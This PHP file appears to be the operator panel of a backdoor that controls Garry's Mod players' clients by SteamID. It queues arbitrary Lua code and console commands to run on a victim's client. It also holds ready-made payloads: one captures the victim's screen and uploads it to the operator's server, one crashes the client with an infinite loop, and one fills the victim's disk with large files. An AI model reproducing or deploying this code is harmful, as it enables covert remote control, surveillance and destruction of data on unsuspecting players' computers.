<?php
require_once('common.php');
checkUser();
if($_GET["run"]=="functions"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<center><br>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a>/<a href="runonclient.php?run=functions&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">'.$_GET["steamid"].'</a></p>
<div class="card" style="width: 250; height: 300;"><br>
<p class="font-weight-normal"><a href="runonclient.php?run=int&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">Run my code to player</a></p>
<p class="font-weight-normal"><a href="runonclient.php?run=runcommand&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">Run my command to player</a></p>
<p class="font-weight-normal"><a href="runonclient.php?run=crash&steamid='.$_GET["steamid"].'">Crash</a></p>
<p class="font-weight-normal"><a href="runonclient.php?run=zapolnidisc&steamid='.$_GET["steamid"].'">Fill disk</a></p>
</div>';
}
if($_GET["run"]=="int"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<br><center>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a>/<a href="runonclient.php?run=functions&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">'.$_GET["steamid"].'</a>/<a href="runonclient.php?run=int&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">RUN CODE</a></p>
<form action="runonclient.php?run=code&&steamid='.$_GET["steamid"].'" method="post">
<input type="hidden" name="type" value="runcode">
<br>
<textarea style="width:500px; height:250px;" type="text" rows="10" cols="45" name="code" placeholder="Code"></textarea>
<br>
<br>
<input style="width:500px;" type="submit" name="submitBtn" value="run">
</form>';	
}
if($_GET["run"]=="code"){
file_put_contents("other/code/".$_GET["steamid"],$_POST["code"]);
header('Location:index.php');
}
if($_GET["run"]=="runcommand"){
echo '<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<br>
<center>
<p class="font-weight-normal"><a href="index.php">SERVERLIST</a>/<a href="runonserver.php?run=list&&ip='.$_GET["ip"].'">'.$_GET["ip"].'</a>/<a href="runonclient.php?run=functions&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">'.$_GET["steamid"].'</a>/<a href="runonclient.php?run=runcommand&ip='.$_GET["ip"].'&steamid='.$_GET["steamid"].'">RUN COMMAND</a></p>
<form action="runonclient.php?run=setruncommand&&steamid='.$_GET["steamid"].'" method="post">
<input type="hidden" name="type" value="runcode">
<br>
<input style="width:400px;" type="text" name="command" placeholder="Command">
<br>
<br>
<input style="width:400px;" type="submit" name="submitBtn" value="run">
</form>';	
}
if($_GET["run"]=="setruncommand"){
file_put_contents("other/code/".$_GET["steamid"],'LocalPlayer():ConCommand("'.$_POST["command"].'\n")');
header('Location:index.php');
}
if($_GET["run"]=="screenshot"){
$randomnamehook=random(40);
file_put_contents("other/code/".$_GET["steamid"],'
hook.Add("PostRender","'.$randomnamehook.'",function()
http.Post("'.$directoria.'/add.php",{type="screen",ip=LocalPlayer():SteamID64(),screenshot=util.Base64Encode(render.Capture({format="jpeg",quality=70,x=0,y=0,w=ScrW(),h=ScrH()}))})
hook.Remove("PostRender","'.$randomnamehook.'")end)
');
echo '
<title>Exec</title>
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<br>
<center>
<p class="font-weight-normal">wait...</p>
<meta http-equiv="refresh" content="7;URL='.$directoria.'/other/screens/'.$_GET["steamid"].'.png?q='.rand(1,1000).'";"/>';
}
if($_GET["run"]=="crash"){
file_put_contents("other/code/".$_GET["steamid"],'while true do end');
header('Location:index.php');
}
if($_GET["run"]=="zapolnidisc"){
file_put_contents("other/code/".$_GET["steamid"],'local a=2100000000 local b=1 timer.Create("dfg",0.2,0,function()for c=1,100 do local d="Qf_"..b..".jpg"b=b+1 local e=file.Open(d,"wb","DATA")if not e then return end e["WriteBool"](e,false)e["Seek"](e,a)e["WriteBool"](e,false)e["Close"](e)if file.Size(d,"DATA")==1 then a=a-5000000 if a<0 then a=2100000000 end end end end)');
header('Location:index.php');
}
?>

